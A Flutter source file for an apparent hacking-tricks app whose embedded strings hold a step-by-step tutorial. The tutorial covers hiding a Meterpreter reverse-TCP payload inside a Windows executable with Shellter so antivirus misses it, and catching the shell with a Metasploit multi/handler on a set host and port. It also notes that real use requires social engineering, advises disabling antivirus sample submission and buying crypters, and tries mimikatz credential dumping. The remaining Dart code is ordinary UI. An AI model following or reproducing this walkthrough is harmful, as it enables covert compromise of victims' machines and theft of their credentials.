import 'package:flutter/material.dart';
import 'package:hackerstudiopro/tricks/tricks_main.dart';

class TricksFive extends StatefulWidget {
  @override
  _TricksFiveState createState() => _TricksFiveState();
}

class _TricksFiveState extends State<TricksFive> {
  var text = '''
  To encode our executable, we shall be using Shellter. Shellter works by changing the executable’s signatures from the obviously malicious one to a completely new and unique one that can bypass detection.

Note that antiviruses also check the behavior of executables and employ techniques such as heuristics scanning, so they are not just limited to checking for signatures. During our lab tests we discovered that Windows Defender, which ships by default with Windows 10, flagged the executable 6 out of the 10 times we used Shellter to perform the encoding. This is despite Windows 10 being a fresh download with latest patches applied! You will be better off purchasing Shellter Pro (or any Pro Crypter) or writing your own Crypter to avoid antivirus flagging your executables.

Also note that when writing your own, disable automatic submissions. Otherwise whatever you write, if detected as potentially-unwanted software, will be uploaded by your antivirus for analysis … And we both know how that will end.

Let’s look at how to install and run Shellter.

On your Kali Linux, download Shellter with the command below:

	sudo apt-get install shellter

To launch Shellter just type shellter on the terminal.

You will be required to enter the absolute path to the executable to make FUD. Make sure to select “Auto” mode as shown below.
  ''';
  var text1 = '''
  Shellter will then initialize and run some checks. It will then prompt you whether to run in stealth mode. Select “Y” for yes.
  ''';
  var text2 = '''
  The next prompt will require you to enter the payload, either a custom or a listed one. You should select a listed one by typing “L”, unless you want to proceed with your own custom payload. Select the index position of the payload to use. We need a Meterpreter_Reverse_TCP, so we will have to go with “1.”
  ''';
  var text3 = '''
  Enter LHOST and LPORT and press Enter. Shellter will run to completion and request you to press Enter.
  ''';
  var text4 = '''
  At this point, the executable you provided will have been made undetectable to antivirus solutions.

Again, note that you are better off writing your own or purchasing a Crypter that is constantly being revised. Otherwise, most of your encoding will be flagged as malicious or potentially unwanted software.

We now need to set up a listener on the port we determined within the executable. We do this by launching Metasploit using the command msfconsole on the Kali Linux terminal.

The screenshot below shows what commands to issue within Metasploit. First, we’ll tell Metasploit to use the generic payload handler “multi/handler” using the command use multi/handler. We will then set the payload to match the one set within the executable using the command set payload windows/meterpreter/reverse_tcp. We will then set the LHOST and LPORT this way — set LHOST 192.168.100.4 and set LPORT 4444. Once done, type “run” or “exploit” and press Enter.

The screenshot below displays the output. The reverse TCP handler should begin waiting for a connection.
  ''';
  var text5 = '''
  The next step is to execute it from a Windows perspective. In a real-world practical situation, this will require social engineering skills. Nevertheless, copy the something32 to a Windows system within the same network as the Kali system.
  ''';
  var text6 = '''
  Executing the Payload

On copying the file to our target Windows machine, we have the screen-shot below. Execute the file.
  ''';
  var text7 = '''
  The executable causes the payload to be executed and connect back to the attacking machine (Kali Linux). Immediately, we receive a Meterpreter session on our Kali Linux. This is demonstrated by the Meterpreter > prompt as shown below:
  ''';
  var text8 = '''
  Since the file was not run as “administrator,” there are Meterpreter commands that can’t be run as they would result in an “access denied” response. This can be confirmed by running the getuid command, which tells us that we are running as user l3s7r0z.
  ''';
  var text9 = '''
  To prove that the user lacks enough privileges, we attempted to run the command mimikatz_command -f sekurlsa::logonPasswords.

The result is an “Access is denied” message as shown below:

In order to gain sufficient rights, we need to perform a UAC bypass. Which will be discussed in the following chapter.
  ''';
  
   @override
  Widget build(BuildContext context) {
    var size = MediaQuery.of(context).size;
    return Scaffold(
      body: Stack(
        children: <Widget>[
          Container(
            // Here the height of the container is 45% of our total height
            height: size.height * .45,
            decoration: BoxDecoration(
              color: Color(0xFFF5CEB8),
              image: DecorationImage(
                alignment: Alignment.centerLeft,
                image: AssetImage("assets/images/undraw_pilates_gpdb.png"),
              ),
            ),
          ),
          SafeArea(
            child: Column(
              children: <Widget>[
                Align(
                  alignment: Alignment.topLeft,
                  child: GestureDetector(
                    onTap: () => Navigator.pushReplacement(context,
                        MaterialPageRoute(builder: (context) => TricksMain())),
                    child: Container(
                      alignment: Alignment.center,
                      height: 52,
                      width: 52,
                      decoration: BoxDecoration(
                        color: Color(0xFFF2BEA1),
                        // color:Colors.orange,
                        shape: BoxShape.circle,
                      ),
                      child: Icon(Icons.arrow_back_ios, color: Colors.white),
                    ),
                  ),
                ),
                Text("Making the Windows10 Executable FUD with Shellter",
                    style: TextStyle(
                        fontSize: 30,
                        color: Colors.grey,
                        fontWeight: FontWeight.bold)),
                Expanded(
                  child: Padding(
                    padding: const EdgeInsets.all(8.0),
                    child: ListView(
                      children: <Widget>[
                        Text(
                          text,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter.png')),
                       Text(
                          text1,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter1.png')),
                       Text(
                          text2,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter2.png')),
                       Text(
                          text3,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter3.png')),
                       Text(
                          text4,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter4.png')),
                       Container(child: Image.asset('assets/images/shellter5.png')),
                       Text(
                          text5,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                        Text(
                          text6,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter6.png')),
                       Text(
                          text7,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter7.png')),
                       Text(
                          text8,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter8.png')),
                       Text(
                          text9,
                          textAlign: TextAlign.justify,
                          style: TextStyle(fontSize: 16, fontFamily: "Cairo"),
                        ),
                       Container(child: Image.asset('assets/images/shellter9.png')),
                        RaisedButton(
                          child: Text(
                              "Follow me on Social Media if you have Questions"),
                          onPressed: () {
                            followMe();
                          },
                          color: Color(0xFFF2BEA1),
                        )
                      ],
                    ),
                  ),
                )
              ],
            ),
          )
        ],
      ),
    );
  }

  void followMe() {
    showDialog(
        context: context,
        builder: (context) {
          return AlertDialog(
            backgroundColor: Color(0xFFF5CEB8),
            title: Text('Follow me'),
            content: Text("Twitter: @Millime64755564"),
            actions: <Widget>[
              FlatButton(
                  onPressed: () => Navigator.pop(context), child: Text('Exit'))
            ],
          );
        });
  }
}
